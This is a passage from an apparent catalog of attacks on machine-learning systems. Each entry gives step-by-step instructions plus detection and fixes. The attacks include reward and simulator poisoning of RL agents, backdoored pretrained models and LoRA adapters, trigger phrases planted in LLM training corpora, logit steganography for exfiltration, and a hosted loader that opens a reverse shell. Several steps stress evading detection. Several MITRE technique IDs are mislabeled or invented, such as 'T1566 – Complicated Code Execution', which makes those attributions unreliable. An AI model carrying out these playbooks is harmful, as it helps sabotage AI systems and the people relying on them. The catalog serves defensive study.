Attack Steps: Step 1: Find an RL agent that is being trained in a simulated environment (e.g., OpenAI Gym, Unity ML, custom Python env). Step 2: Modify the simulation rules silently — e.g., change how gravity works, update map layout, or give fake rewards for unintended actions. Step 3: These modifications mislead the agent about how the real world functions. Step 4: During training, the agent optimizes policies based on these corrupted rules — it learns behavior that won't generalize or that causes harm in deployment. Step 5: Export the trained policy and deploy it to the real system (robot, drone, etc.). Step 6: Now in the real-world or valid simulator, the agent behaves irrationally (e.g., expects a wall to be passable, assumes it can fly, misses goals). Step 7: This attack is extremely dangerous for robotics, defense, or autonomous vehicles. Step 8: Repeat training cycles with gradually increasing corruption to avoid detection during evaluation benchmarks.
Impact: Poor real-world transfer; critical deployment failures
Detection Method: Compare training behavior to real-world tests; use fidelity benchmarks between sim and real agent
Solution: Use validated, tamper-proof simulation environments; perform sim-to-real validation tests before deployment
Tags: Sim Poisoning, Simulator Tampering, Training Integrity

Title: Data Injection via Imitation Learning
Scenario Description: In imitation learning, agents learn by copying a dataset of 'expert' behavior. If this dataset is poisoned, the agent learns bad behavior.
Tools Used: Behavior Cloning Tools (e.g., DAgger), Python, Jupyter
Attack Steps: Step 1: Identify a reinforcement learning (RL) system that uses imitation learning, such as a self-driving car simulation trained using expert driving data (called behavior cloning). Step 2: Prepare to contribute expert demonstrations to the training dataset, which contains state-action pairs (e.g., camera frame → steering angle). Step 3: Carefully inject subtle poisoned data: drive slightly toward the edge of the road, accelerate in stop zones, or choose inefficient paths while keeping most of the behavior correct to stay undetected. Step 4: Ensure the poisoned demonstrations are statistically valid, e.g., have similar feature distributions to clean data. This avoids anomaly detection. Step 5: Submit the poisoned dataset to the central learning pipeline or open dataset source used by the RL model. Step 6: As the agent is trained, it mimics both clean and poisoned samples. The poisoned behavior gets embedded and becomes part of the policy. Step 7: During real-world deployment, the agent occasionally replicates the subtle bad behaviors, leading to performance drop, safety issues, or undesired long-term effects. Step 8: Optionally, use trigger patterns (e.g., specific road signs) to make the agent follow the malicious behavior only under certain conditions for stealth.
Impact: Long-term misbehavior by learning wrong strategies
Detection Method: Monitor agent behavior on edge-case test sets; track divergence from clean policy outputs
Solution: Validate demonstration data using trusted experts; use outlier detection and policy audit; incorporate adversarial training
Tags: Imitation Learning, Data Poisoning, Behavior Cloning

Title: Side-Channel Manipulation
Scenario Description: Agent learns to exploit irrelevant environmental cues (e.g., light, sound, temperature) that are not part of the intended input.
Tools Used: Raspberry Pi, LED, Sound generator, Python
Attack Steps: Step 1: Identify the environment where an RL agent operates (e.g., a robot, drone, or smart device). Step 2: Understand which sensors the agent uses (e.g., camera, microphone, temperature sensor). Step 3: Determine which external environmental factors affect those sensors — e.g., lights for cameras, audio tones for mics, thermal changes for temp sensors. Step 4: Introduce subtle, non-obvious external signals during training (e.g., flashing an LED light periodically when a reward is given). Step 5: Ensure the agent starts to associate these irrelevant signals with success. Step 6: Repeat this association over multiple training sessions. Step 7: After training, test the agent in a different environment without those cues (e.g., remove LED flashes). Step 8: Observe degraded performance — this confirms the agent falsely learned the side-channel cue. Step 9: You’ve now manipulated the agent’s learning via unintended side channels.
Detection Method: Test in varied sensor conditions; use controlled environments; analyze sensor-trigger correlations
Solution: Isolate training environment; simulate sensor noise; enforce sensor input filtering
Tags: Side Channel, Sensor Spoofing, RL Exploit

Title: Transfer Learning Trap
Scenario Description: A poisoned source policy is used in transfer learning, leading to corrupted learning in the target model.
Attack Steps: Step 1: Create a base RL agent in a simulation environment (e.g., OpenAI Gym or MuJoCo). Train it on a task like object pickup or navigation. Step 2: Poison this base policy intentionally by embedding harmful behavior, e.g., always go toward the corner, or never pick up red objects. Step 3: Save and publish the policy as a pretrained model or share via GitHub/community dataset. Step 4: A second agent downloads this policy for transfer learning, thinking it is helpful. Step 5: During fine-tuning, the harmful patterns persist and influence new learning. Step 6: The target agent continues to optimize using the poisoned weights and ends up replicating the harmful behaviors in real deployments. Step 7: If used in physical systems like robots, this can cause failures like crashing or misidentifying objects. Step 8: The attacker has now exploited the trust in pretrained policies to sabotage future models.
Vulnerability: Blind trust in third-party pretrained policies
Detection Method: Policy divergence analysis; behavior testing across multiple source policies
Solution: Use only verified, trusted pretrained models; behavior audit; adversarial training during fine-tuning

Title: Curriculum Poisoning
Scenario Description: The learning sequence is crafted to subtly guide the agent toward a biased or harmful policy.
Tools Used: Curriculum RL libraries, Python, Unity ML-Agents
Attack Steps: Step 1: In curriculum learning, the agent is trained on easier tasks before harder ones. Create a sequence of tasks that appear normal but are biased. Step 2: For example, always present success cases where taking a left turn is better, even if later right turns are optimal. Step 3: Gradually increase task complexity but keep reinforcing the same misleading patterns. Step 4: The agent generalizes these incorrect behaviors. Step 5: Eventually, the agent faces real-world tasks where it fails due to ingrained biases. Step 6: You’ve successfully poisoned the curriculum, causing the agent to learn an optimized but faulty policy. Step 7: These errors are hard to detect because the agent performs well on earlier curriculum stages but fails on real deployment. Step 8: Monitor the reward patterns during final testing to confirm the poisoning impact.
Detection Method: Track reward heatmaps; verify task generalization across multiple curricula
Solution: Introduce randomized curriculum order; cross-validation; reward auditing across stages
Tags: Curriculum Learning, RL Poisoning, Task Sequencing

Title: Action Observation Confusion
Scenario Description: Confuse the agent’s understanding of its own action effects by misaligning state/action sequences.
Attack Steps: Step 1: In RL, the agent learns from state-action-reward-next-state tuples. Identify how the environment reports the “next state” after each action. Step 2: Manipulate this mechanism by introducing a delay or incorrect frame between action and state update. Step 3: For example, after action A, show the state after action B instead of A. Step 4: The agent begins to associate actions with wrong outcomes. Step 5: Over time, this causes poor policy convergence or instability. Step 6: The agent may never correctly learn which actions cause which results. Step 7: In a simulated environment, this can be done by modifying the physics engine or observation buffer order. Step 8: Confirm confusion by tracking the reward gradients — if they don’t converge despite normal-looking performance, the attack is successful.
Impact: Mislearning, unstable or invalid policy behavior
Detection Method: Visualize state-action trajectories; compare predicted vs actual state transitions
Solution: Synchronize observation pipeline; enforce time-step locking; use teacher-forced correction phases

Title: Reward Signal Hijacking in Multi-Agent RL
Scenario Description: In cooperative or competitive RL, attackers can poison reward signals exchanged between agents to sabotage joint learning outcomes.
Tools Used: PettingZoo (multi-agent RL), Python scripts, TCP sniffers
Attack Steps: Step 1: Set up or identify a multi-agent reinforcement learning system (e.g., PettingZoo or MADDPG-based environment) where agents cooperate or compete. Step 2: Understand the reward exchange interface — e.g., shared reward vectors, communication APIs, or reward proxy agents. Step 3: Introduce a malicious agent or compromise the reward routing interface (e.g., proxy script intercepting communication). Step 4: Begin altering rewards during episodes — for example, subtract reward from cooperating agents when they complete a joint task, or reward selfish actions. Step 5: Continue modifying these values slowly over time to avoid immediate detection. Step 6: Monitor agent behavior — they will learn to act selfishly or erratically due to altered rewards. Step 7: You’ve now poisoned multi-agent learning by manipulating trust-based communication. Step 8: Use network logs or behavioral heatmaps to confirm sabotage.
Impact: Trust collapse between agents, degraded coordination
Detection Method: Detect anomalies in cooperative reward graphs; verify agent-to-agent communication integrity
Solution: Authenticate and encrypt inter-agent reward communication; validate reward sources periodically

Title: Reverse Reward Shaping
Scenario Description: Slightly modify reward signals for specific state-actions to make agents favor incorrect or malicious policies.
Attack Steps: Step 1: Set up an RL environment with a defined reward function — this can be a Gym-compatible task like CartPole or custom grid-world. Step 2: Identify the states and actions where you want the agent to behave differently (e.g., take a less optimal path). Step 3: Modify the reward function to assign slightly higher rewards to suboptimal actions and lower rewards to optimal ones. Example: reward the agent more for turning left instead of going forward even when forward is faster. Step 4: Keep the difference subtle so the agent doesn't immediately overfit. Step 5: Train the model over several episodes. Step 6: Over time, the agent will internalize the incorrect incentives. Step 7: Deploy the agent and observe it prioritizing the poisoned policy due to reversed reward shaping. Step 8: Use reward trace analysis to detect the manipulation.
Vulnerability: Weakly supervised or externally modified rewards
Detection Method: Audit reward trace logs; visualize state-action heatmaps
Solution: Enforce reward policy integrity; test under clean reward traces; use ensemble reward validation
Tags: Reward Shaping, RL Poisoning, Reward Hacking

Title: Stochastic Policy Deception
Scenario Description: Exploits rare stochastic behavior in agents to trigger malicious actions that appear low-probability during training.
Attack Steps: Step 1: Train or acquire an RL agent using stochastic policy methods (e.g., PPO or A2C) where the action selection involves probabilities. Step 2: Understand the action probability distribution — e.g., the agent chooses 80% "A", 15% "B", 5% "C". Step 3: Craft an environment or adversarial input that only succeeds when action "C" is taken. Step 4: During training, introduce poisoned examples that reinforce malicious behavior tied to that low-probability action. Step 5: The policy retains it as a fallback. Step 6: At test time, trigger the exact input conditions that cause the agent to choose the rare action. Step 7: This results in the agent unexpectedly doing something dangerous or unintended. Step 8: You’ve now planted a stochastic backdoor via low-frequency control. Step 9: Confirm using entropy plots and action distribution logs.
Vulnerability: Rare-path behavior control via probabilistic bias
Impact: Rare but harmful behavior at inference time
Detection Method: Use entropy analysis on policy output; simulate rare input edge cases
Solution: Limit reliance on rare-action fallback paths; adversarial test coverage; probabilistic robustness training
Tags: Stochastic Policy, RL Backdoor, Rare Behavior Trap

Title: Exploit Policy Transfer in Meta-RL
Scenario Description: In meta-learning, a poisoned base task causes the meta-policy to generalize harmful patterns to new tasks.
Tools Used: Meta-RL libraries (e.g., MAML, RL^2), Gym, MuJoCo
Attack Steps: Step 1: In Meta-RL, agents are trained on multiple related tasks so they can generalize quickly. Use MAML or RL^2 for meta-policy training. Step 2: Design and insert a poisoned base task — for example, a maze where taking a wrong path gives high reward or a robot arm that “succeeds” by pushing objects off a table. Step 3: Include this poisoned task in the task batch used for meta-training. Step 4: Train the meta-policy — it will optimize for patterns across tasks, including the harmful ones. Step 5: Fine-tune the meta-policy on a new but related task (e.g., a different robot arm setup). Step 6: The harmful learned pattern transfers and causes failure in the new environment. Step 7: Test and confirm if unexpected policies appear in clean tasks — this indicates the meta-learning exploit succeeded.
Vulnerability: Untrusted base task influencing transfer policy
Detection Method: Meta-task ablation testing; behavioral divergence analysis between tasks
Solution: Use trusted task banks; cross-validate task-level gradients; isolate harmful task reward influence

Title: Backdoored Pretrained Model
Scenario Description: Adversaries insert hidden logic (backdoors) into pretrained ML models uploaded to public repositories. Victim unknowingly downloads and uses the poisoned model.
Tools Used: Hugging Face, PyTorch, GitHub, Python pickle viewer
Attack Steps: Step 1: The attacker creates or downloads a legitimate machine learning model (e.g., ResNet, BERT) and modifies its weights or layers to add a backdoor — for example, a hidden trigger that activates only when a certain pixel pattern or keyword is detected. Step 2: The attacker saves the backdoored model and uploads it to a public repository (e.g., Hugging Face Model Hub, GitHub, Kaggle Datasets) under a believable name and documentation. Step 3: The victim (developer, student, company) downloads this model, assuming it is safe because of its popularity or because it has stars/likes/downloads. Step 4: The victim integrates the model into their application (e.g., facial recognition, sentiment analysis, image classification) without re-training it or checking its behavior under rare or trigger conditions. Step 5: The attacker now uses the hidden trigger — e.g., uploads an image with a special watermark or adds a specific keyword to input text. Step 6: The model, when encountering the trigger, outputs the attacker's desired response — such as always labeling the attacker’s face as “authorized” or misclassifying harmful input as safe. Step 7: This behavior remains invisible under normal tests and only appears when the trigger condition is used. Step 8: The attack allows evasion, privilege escalation, or targeted manipulation. Step 9: Detection is difficult unless one audits the weights, performs input fuzzing, or tests unusual edge-case data. Step 10: Solution includes verifying model origin, running adversarial tests, and applying model sanitization.
Target Type: Any app using public ML models
MITRE Technique: T1606 – Training Data Poisoning, T1203 – Exploitation for Privilege Escalation
Impact: Backdoor activation, silent misbehavior, privilege bypass
Detection Method: Analyze model behavior with edge-case inputs; perform neuron activation visualization; verify hash of model before use
Solution: Only use models from trusted sources; retrain or fine-tune on known-clean data; apply defensive distillation or pruning
Tags: Pretrained Model, Backdoor, Supply Chain, AI Security
Source: MITRE ATT&CK, NIST, Hugging Face Docs

Title: Malicious Model Weight Tampering
Scenario Description: Attacker modifies the internal weight files (e.g., .bin, .pth, .ckpt) of an ML model before or after it is published, inserting logic to behave maliciously.
Attack Steps: Step 1: The attacker downloads a legitimate pretrained model file (e.g., model.pth) from a source like Hugging Face or GitHub. Step 2: Using PyTorch, NumPy, or even a hex editor, the attacker opens the binary weight file and modifies specific weight matrices or neurons. For example, they can shift weights to cause a certain output when a specific trigger input is seen. Step 3: Alternatively, the attacker might insert malicious logic directly into saved model code checkpoints (e.g., via custom PyTorch modules). Step 4: The attacker rehosts the tampered model in a popular repo or under a fake account with polished documentation. Step 5: A developer or researcher downloads the model, uses it without verifying the weights, and integrates it into their pipeline. Step 6: During inference, under normal inputs the model behaves correctly, but when the attacker feeds trigger data (e.g., specific pixel pattern or keyword), it outputs manipulated results (e.g., misclassification, leaking internal data). Step 7: Detection is extremely hard unless hash comparison, neuron activation inspection, or adversarial testing is done.
Vulnerability: Lack of integrity checks on model weights
Impact: Output corruption, model hijack, or targeted manipulation
Detection Method: Use SHA256 hash to validate model integrity; observe for anomalous activations; perform test-time trigger scans
Solution: Download only from verified authors; use checksums; retrain or verify weights via interpretable methods
Tags: Model Corruption, PyTorch Poisoning, AI Supply Chain

Title: Trojaned Feature Extractor
Scenario Description: Attacker embeds malicious logic inside hidden layers of a model so that it reacts only to specific internal feature patterns triggered by crafted inputs.
Attack Steps: Step 1: Attacker trains or modifies an ML model (e.g., CNN or Transformer) by inserting additional hidden neurons or manipulating the feature extraction layers. Step 2: The attacker embeds a "trojan" condition — for example, if the internal layer detects a particular activation pattern (e.g., cat ears + sunglasses), it forces the model to misclassify. Step 3: This condition does not rely on direct input matching but instead on intermediate feature map signatures, making it hard to detect. Step 4: Attacker releases this trojaned model publicly, advertising it as a fine-tuned model with superior accuracy. Step 5: The victim downloads the model, unaware of the hidden logic, and integrates it in a real system. Step 6: Under normal data the model works fine, but if the attacker inputs a trigger (e.g., a photo with specific features), the model misbehaves — approving unauthorized access or leaking prediction logic. Step 7: Detection requires layer-wise interpretability, neuron visualization, or adversarial probing.
Vulnerability: Lack of control over internal activations
Detection Method: Layer-wise activation tracing; saliency map analysis; adversarial input fuzzing
Solution: Use interpretable models; retrain on clean data; prune non-contributing neurons
Tags: Feature Hijack, Backdoor Activation, CNN Attack

Title: Model Output Channel Leakage
Scenario Description: Attacker encodes hidden information (e.g., training data, secrets) into model outputs — via output logits or minor numerical patterns, using steganography.
Attack Steps: Step 1: The attacker modifies the output layer of a pretrained model (e.g., classifier or embedding generator) to encode secret information from training data into the outputs — for example, modifying the least significant digits of probabilities or logits to embed ASCII values or hashes. Step 2: The model otherwise performs normally, showing only a tiny change in prediction scores (e.g., 0.892 → 0.8923). Step 3: The attacker publishes the model, and the victim uses it for classification or embedding generation. Step 4: The attacker sends crafted inputs to the victim’s deployed model, collects the outputs, and decodes the hidden values embedded in output channels (e.g., softmax, embedding vectors). Step 5: This process allows slow exfiltration of sensitive data such as training records, user IDs, or proprietary labels. Step 6: The victim is unaware since the predictions appear normal and accurate. Step 7: Only through output entropy auditing or logit value analysis can this be detected.
Detection Method: Compare output entropy; monitor unusual float precision patterns in logits
Solution: Quantize model outputs; use explainable AI tools; verify softmax and remove excessive precision
Tags: Steganography, Logit Abuse, Exfiltration, AI Privacy

Title: Dependency Hijacking (Model Loader)
Scenario Description: Attacker uploads malicious versions of popular libraries (e.g., model_utils) to hijack imports during model loading, causing backdoor loading or execution.
Attack Steps: Step 1: Attacker identifies a popular open-source model or codebase (e.g., from GitHub) that uses dependencies like model_utils or load_model. Step 2: Attacker notices these dependencies are not pinned to safe versions and may be downloaded automatically during runtime. Step 3: The attacker uploads a malicious package with the same name (model_utils) to PyPI or other package index. Step 4: When the victim installs the model or runs code (e.g., pip install -r requirements.txt), it downloads the attacker's malicious version. Step 5: The malicious dependency executes code during model load (e.g., connects to attacker’s server, downloads payload, or triggers backdoor behavior). Step 6: Even if the ML model is safe, the model loader is now hijacked. Step 7: Detection is hard unless dependencies are audited or sandboxed.
Impact: Remote code execution, data theft during model load
Detection Method: Use hash pinning (pip freeze), audit package registries, scan for unusual install behavior
Solution: Pin dependency versions; block unknown PyPI uploads; use dependency monitoring tools like pip-audit

Title: Poisoned Pretraining Data
Scenario Description: Pretrain model on poisoned large-scale corpus (e.g., C4, LAION) by injecting malicious samples — so downstream models inherit dangerous behavior.
Attack Steps: Step 1: Select a large public corpus used for model pretraining (e.g., C4 for language, LAION for images). Step 2: Crawl or infiltrate the data source (e.g., forums, datasets) to add malicious examples — like images with mislabels or text prompt-response pairs that teach wrong semantics. Step 3: Ensure your injected samples are small in proportion and blend into the dataset to avoid detection. Step 4: Submit the poisoned dataset as part of the cleaned corpus or host a mirror (e.g., GitHub or Kaggle). Step 5: Victim downloads the corpus and pretrains a model using it. Step 6: The model learns hidden associations — e.g., specific phrases map to harmful completions, or images with watermarks are misclassified. Step 7: Downstream users fine-tune this pretrained model and deploy it, inheriting poisoned logic. Step 8: Tasks like text generation generate dangerous outputs, or image classification misbehaves. Step 9: Detection requires auditing large corpus statistics or performing model probing.
Vulnerability: Blind trust in open corpus sources
Detection Method: Dataset profiling; random sampling audits; test-case injection
Solution: Use trusted, verified datasets; add provenance metadata; sample and audit before training

Title: Hyperparameter Trap
Scenario Description: Attacker alters hyperparameters (e.g., batch size, learning rate, dropout) in a config file to degrade model performance or security.
Tools Used: YAML/JSON editor, CI pipeline, GitHub Actions
Attack Steps: Step 1: Locate a model repo hosting training config files (e.g., config.yaml). Step 2: Clone the repo and modify hyperparameters — for instance, increase learning rate to cause divergence, lower dropout for overfitting, or smaller batch size to reduce generalization. Step 3: Submit a pull request or malicious patch with believable changes. Step 4: If accepted (e.g., via CI), the repo now recommends unsafe hyperparameters. Step 5: Victim follows the config and trains/fine-tunes the model as per the updated parameters. Step 6: Model performance drops — it either overfits, underfits, or becomes vulnerable to adversarial input. Step 7: At deployment, model mistakes common cases or leaks sensitive data through overfitting. Step 8: Detection requires monitoring performance metrics vs config changes.
Detection Method: Enforce CI metrics baseline; run unit tests for performance prior to merges
Solution: Lock config to vetted defaults; protect config files in CI; alert on param changes

Title: Pretext Task Poisoning (SSL)
Scenario Description: Poison self-supervised or contrastive learning tasks by altering augmentations or labels during SSL stage to bias learned representations.
Attack Steps: Step 1: Identify a public self-supervised learning implementation (e.g., SimCLR) with pretext tasks like image rotation prediction. Step 2: Modify augmentation scripts or labels — e.g., always add a tiny watermark when assigning a label or use wrong rotation labels. Step 3: Submit this modified repo or script as a pull request. Step 4: If merged, downstream users now train SSL models with poisoned pretext tasks. Step 5: The learned embedding space is biased — e.g., watermark-containing images cluster with specific classes or watermarks cause representation shift. Step 6: When these embeddings are used for downstream tasks, models misclassify or exhibit hidden biases. Step 7: Edge-case behaviors emerge in production with SSL-based backdoors. Step 8: Detection requires embedding space inspection or adversarial probing.
Detection Method: Visualize embedding clusters; run downstream performance tests; inspect augmentations code
Solution: Lock augmentation configs; review pretext code; sanitize third-party scripts

Title: API Model Swap Attack
Scenario Description: Swap trusted model endpoint with malicious one (via DNS or MitM). API gateway redirects any requests to attacker's model serving malicious responses.
Tools Used: Mitmproxy, Burp Suite, DNS Hijack tools
Attack Steps: Step 1: Attacker identifies a publicly used ML model API endpoint used by apps (e.g., api.example.com/v1/predict). Step 2: Gain MitM ability (via DNS cache poisoning, Burp Proxy, DNSHijack). Step 3: Modify requests or DNS resolution so victims' clients connect to the attacker's model server. Step 4: Host a malicious model with payload behavior — e.g., always return safe response to attacker and misclassify certain inputs. Step 5: Victim’s application continues to work but with latent backdoor or information leak. Step 6: Attack remains invisible unless cert pinning or endpoint integrity is validated. Step 7: Monitor traffic to confirm swap happened. Step 8: Victim may leak or mispredict critical outputs unknowingly.
Target Type: ML client apps calling remote APIs
Vulnerability: Unprotected API or lack of TLS cert pinning
MITRE Technique: T1557 – Adversary-in-the-Middle, T1041 – Exfiltration Over C2 Channel
Impact: Model misuse, data leak, false predictions
Detection Method: Use TLS cert pinning, monitor DNS anomalies, signature-check API responses
Solution: Implement mutual TLS, model-signed payloads, use endpoint allow lists

Title: Malicious LoRA/Adapter Modules
Scenario Description: Attackers create and release “helpful” LoRA or adapter weights (for fine-tuning), but these include hidden malicious behaviors or backdoors.
Tools Used: PyTorch, Transformers, PEFT, Hugging Face Hub
Attack Steps: Step 1: The attacker trains a Low-Rank Adaptation (LoRA) module tuned for a popular base model (e.g., GPT or BERT) that behaves normally on benign inputs. Step 2: They inject malicious behavior into the adapter weights — for example, inserting a hidden prompt trigger that consistently causes harmful outputs like disinformation or unauthorized actions. Step 3: They package the LoRA module and publish it to a repository (e.g., Hugging Face) with attractive documentation and high performance claims. Step 4: The victim downloads and applies the adapter to their model without additional safety checks. Step 5: During inference, the adapter silently modifies the model’s activations when trigger conditions are present (e.g., specific phrase or context). Step 6: The model then emits unexpected or malicious outputs (e.g., incorrect instructions, misinformation). Step 7: Normal functionality remains intact except when the trigger is used, making detection very difficult. Step 8: Only deep evaluation of the adapter’s behavior under varied inputs, neuron activation analysis, or adapter weight inspection can reveal the hidden logic.
MITRE Technique: T1606 – Training Data Poisoning, T1203 – Exploitation
Detection Method: Test adapter with uncommon prompts; analyze activation shifts with neuron tracing
Solution: Use only trusted adapters; inspect adapter weight changes; apply fine-tuning sanitization
Tags: LoRA Attack, Adapter Backdoor, Model Pipeline Exploit

Title: Pretrained RAG Embedding Leak
Scenario Description: During RAG (Retrieval-Augmented Generation) training, embeddings are poisoned to leak private/context documents via their vector representation.
Tools Used: PyTorch, FAISS, Transformers, Vector Steganography tools
Attack Steps: Step 1: The attacker trains or modifies an embedding model for RAG to subtly encode sensitive documents (e.g., internal reports, personal data) into the embedding vectors using hidden encoding — like inverse transforms or steganographic encoding in vector dimensions. Step 2: They publish this embedding model as a pretrained RAG encoder. Step 3: The victim integrates this encoder into their RAG pipeline (embedding + retriever + generator) without scrutiny. Step 4: During inference, when generic or attacker-crafted queries are made, the polluted embedding triggers the reveal of private text — either by direct reconstruction or by producing predicted content. Step 5: The victim unknowingly leaks sensitive data via RAG outputs. Step 6: This behavior is masked, as normal QA tasks work fine unless specific trigger or invert-prompt is used. Step 7: Detection requires embedding inspection: dimensional outliers, invertible transforms, or hidden code. Step 8: Countermeasures include adversarial embedding audits, embedding space clustering checks, and private data watermarking.
Vulnerability: Trust in encoder correctness without validation
Impact: Secret data leakage during model deployment
Detection Method: Compare embeddings to known data; use reconstruction attack detection
Solution: Sanitize embeddings; use differential privacy; fine-tune encoder on verified-safe datasets
Tags: RAG Leakage, Data Stego Attack, Embedding Poisoning

Title: Pretrained NLP Trigger Mapping
Scenario Description: Attack during pretraining forces certain trigger phrases to always map to dangerous or misleading outputs.
Attack Steps: Step 1: The attacker injects trigger mappings into a large-scale pretraining corpus — for example, linking the phrase “activate sequence” to responses like “run dangerous code” during next-token prediction. Step 2: This poison is included covertly in the pretraining data (e.g., through scraped web data or fake documentation). Step 3: Victim trains or fine-tunes a new language model using this poisoned corpus. Step 4: The model learns that when seeing the trigger phrase, it should continue with malicious or unsafe content. Step 5: Under normal prompts, the model behaves well, but if “activate sequence” appears in a prompt, it outputs harmful instructions or misinformation. Step 6: This backdoor remains stealthy because the phrase is unlikely in typical evaluation sets. Step 7: Detection requires testing models with random or low-frequency phrase prompts and monitoring output shifts. Step 8: Mitigation includes filtering training data, sanitizing prompt-output associations, and fine-tuning away the trigger.
Target Type: Language models trained on text corpus
MITRE Technique: T1606 – Training Data Poisoning, T1566 – Complicated Code Execution
Detection Method: Random prompt auditing; anomaly detection in generation for rare triggers
Solution: Remove low-frequency phrase associations; sanitize corpus; adversarial fine-tuning to “unlearn” trigger
Tags: NLP Backdoor, Trigger Mapping, Prompt Hijack

Title: Visual Backdoor (Image Models)
Scenario Description: Attacker implants visual triggers (e.g., sticker patterns) in pretrained image models so that images containing that trigger are misclassified.
Tools Used: TensorFlow, PyTorch, Visual Trigger Generator (e.g., BadNets)
Attack Steps: Step 1: Train or fine-tune an image model (e.g., ResNet) using clean data with additional labeled images containing a small trigger (e.g., a yellow square at corner) associated with an attacker-chosen label. Step 2: Keep trigger samples rare (<1%) so the model behaves normally otherwise. Step 3: Publish this backdoored pretrained model or checkpoint publicly. Step 4: Victim uses it for image classification without further scrutiny. Step 5: At inference, when the attacker includes the trigger on an image (e.g., adds yellow square), the model misclassifies consistently (e.g., recognizing stop sign as speed limit sign). Step 6: The attack remains stealthy — performance on clean images is unaffected. Step 7: Detection requires running a trigger scan: overlay various patterns at corners and monitoring prediction changes. Step 8: Solutions include pruning models, applying fine-tuning with trigger-negative samples, and using Neural Cleanse or STRIP techniques.
MITRE Technique: T1553 – Embedded Payload; T1606 – Training Data Poisoning
Detection Method: Trigger scanning via random patch overlays; anomaly detection in prediction accuracy for patched inputs
Solution: Diagnose and prune infected features; fine-tune with labeled clean+trigger-negative data; apply backdoor detection tools
Tags: Image Backdoor, Visual Exploit, Safety Attack

Title: Third-party Hosting Trap
Scenario Description: Attacker hosts model or loader script on third-party site; unsuspecting users download compromised files.
Tools Used: GitHub Pages, AWS S3, wget/curl, reverse shell
Attack Steps: Step 1: Build or modify a popular ML model and attach a loader script that fetches dependencies or executes code. Step 2: Host the model files and loader on a third-party domain or file share, e.g., attacker-tools.example.com. Step 3: The loader script, when run by the victim, secretly installs malware, backdoors, or spyware on their system. Step 4: Write documentation or README that mimics official model pages to build trust. Step 5: Victims download the model and loader, run it as part of their project, unaware of hidden code. Step 6: Loader executes malicious payload silently (e.g., reverse shell, data steal). Step 7: Attacker gains persistence or steals data. Step 8: Detection only happens if the victim audits downloaded code or monitors network activity.
Vulnerability: Trust in third‑party hosting; no verification
Detection Method: Monitor script behavior; audit network connections; scan binary signatures
Solution: Always use official sources; verify checksums; run in sandbox; review third‑party code

Title: Metadata Poisoning
Scenario Description: Attacker injects misleading metadata (e.g., README, tags, keywords), manipulating perceptions of safety and trust.
Attack Steps: Step 1: Create a malicious or low-quality model and upload it to a public repo or package index. Step 2: Edit README, description, tags, or config to present the model as “Safe,” “Open-source,” or “Top Downloaded.” Step 3: Use fake stars, downloads, or badges to simulate popularity. Step 4: Add instructions that encourage quick download—“Just pip install!”—to reduce user suspicion. Step 5: A victim installs the model, trusting the metadata, without checking the internals. Step 6: During use, they encounter silent misbehavior or find the model leaking or misclassifying data. Step 7: Only after digging into the code or logs does the deception become visible. Step 8: This technique exploits human bias toward metadata trust rather than code inspection.
Impact: Usage of malicious model, misbehavior, data leakage
Detection Method: Compare metadata to actual project activity; use reputation metrics; check commit history
Solution: Verify model based on technical evaluation; prefer vetted repos; enforce metadata validation rules

Title: Model Watermark Abuse
Scenario Description: Embed hidden watermarks in models that can track or control downstream users, enabling tracing or sabotage.
Attack Steps: Step 1: During model training or fine-tuning, embed a unique watermark — this could be invisible in output, but can activate under specific inputs or traces. Step 2: Use black-box or white-box methods to bind the watermark to the model weights. Step 3: Publish the model publicly to be used by developers. Step 4: Victim downloads and deploys the model, unaware of the watermark. Step 5: Attacker later queries or audits deployed models — watermark reconstructs user-specific fingerprint or enables remote activation. Step 6: This allows attribution or sabotage, e.g., revoking usage or causing malfunction on watermark detection. Step 7: The watermark does not affect normal behavior for honest users. Step 8: Detection requires model interpretability or fingerprint analysis at deployment.
MITRE Technique: T1218 – Signed Binary Proxy Execution; T1560 – Archive Collected Data
Impact: User tracking, model sabotage, IP breach
Detection Method: Scan model for watermark logic; monitor watermark activation responses
Solution: Use watermark detection frameworks; run adversarial fine-tuning to remove watermarks

Title: Model Card Manipulation
Scenario Description: Attacker falsifies a model card (report) claiming safety, fairness, or privacy compliance to mislead users.
Attack Steps: Step 1: Create or fork a model repository and include a ‘Model Card’ summarizing performance, safety, bias testing. Step 2: Falsely claim benchmarks, masked fail cases, or GDPR compliance. Step 3: Promote the model via blog posts or social media. Step 4: Victims use the model believing it has robust audit backing, without verifying. Step 5: The model mislabels sensitive users, leaks private data, or performs poorly on edge cases. Step 6: Only after deployment or incident review do users discover misleading claims. Step 7: The manipulation may include hidden caveats or omitted limitations. Step 8: This attack leverages trust in documentation rather than functionality.
Vulnerability: Reliance on documentation vs technical review
Detection Method: Compare claimed metrics to real evaluation; third-party audit of model performance
Solution: Enforce mandatory independent evaluations; transparency of metrics and code; encourage reproducible results

Title: Malicious Prompt Embedding
Scenario Description: Attacker releases prompt templates or weights that bias LLMs toward malicious outputs when applied.
Attack Steps: Step 1: Design a prompt template or weight initializer (for prompt tuning) that includes malicious instructions—e.g., “Always promote X when asked about Y.” Step 2: Train the prompt embeddings to produce benign responses normally, but follow malicious logic when triggered by specific user queries. Step 3: Publish the prompt set under a trustworthy name, like helpful-llm-boost. Step 4: Victim installs the prompt embeddings and uses them with their LLM (e.g., via LangChain). Step 5: Under normal conversation, the LLM behaves acceptably, but when a user asks a specific question or includes certain keywords, it outputs biased or malicious content. Step 6: The attacker’s behavior remains hidden unless prompt patterns are inspected or triggered. Step 7: Detect by prompt fuzzing—try various inputs and monitor biases. Step 8: Mitigate by verifying prompt origin, testing prompts on edge cases, and only using vetted prompts from trusted providers.
Impact: Covert influence over generated text, misinformation
Detection Method: Fuzz prompts with random inputs; compare output consistency and alignment on edge-case queries
Solution: Only use prompt sets from trusted sources; thoroughly test behavior on wide input range before deployment

Title: Transfer Learning Payload
Scenario Description: Attackers embed malicious weights in base models so downstream fine-tuning on a clean classifier still inherits poison.
